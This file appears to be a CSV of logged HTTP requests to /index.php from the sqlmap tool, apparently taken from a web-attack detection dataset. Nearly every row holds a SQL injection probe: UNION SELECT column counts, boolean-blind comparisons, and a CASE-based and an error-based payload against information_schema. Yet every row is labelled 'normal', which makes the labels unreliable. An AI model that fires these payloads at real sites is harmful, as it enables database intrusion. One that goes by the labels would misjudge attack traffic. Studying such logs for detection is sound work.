/,,*/* close,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null,null,null-- kqhx",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs order by 1-- hhho,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null-- jqlj",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null-- tnte",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null-- mxxy",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs union all select null,null,null,null,null,null,null,null,null-- xbza",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",5011,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs,),'.),"".,",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs'kyitxz<'"">wzwryl",normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 3279=1624 and ('osho'='osho,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs') and 8937=8937 and ('qjgq'='qjgq,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 3182=9646 and 'qcog'='qcog,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs' and 8937=8937 and 'twcn'='twcn,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 3883=4620 and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs%' and 8937=8937 and '%'=',normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 9576=1891 and (9086=9086,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs) and 8937=8937 and (2444=2444,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 6426=3298,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 8937=8937,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 1035=9949-- ifpm,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",edfs and 8937=8937-- whdj,normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (case when (5571=9766) then 5571 else 5571*(select 5571 from information_schema.plugins) end)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)",(select (case when (6777=6777) then 6777 else 6777*(select 6777 from information_schema.plugins) end)),normal
/index.php,,"*/* gzip,deflate no-cache close sqlmap/1.2.4#stable (http://sqlmap.org)","edfs') and (select 1540 from(select count(*),concat(0x716b716a71,(select (elt(1540=1540,1))),0x7171717671,floor(rand(0)*2))x from information_schema.plugins group by x)a) and ('xmiu'='xmiu",normal
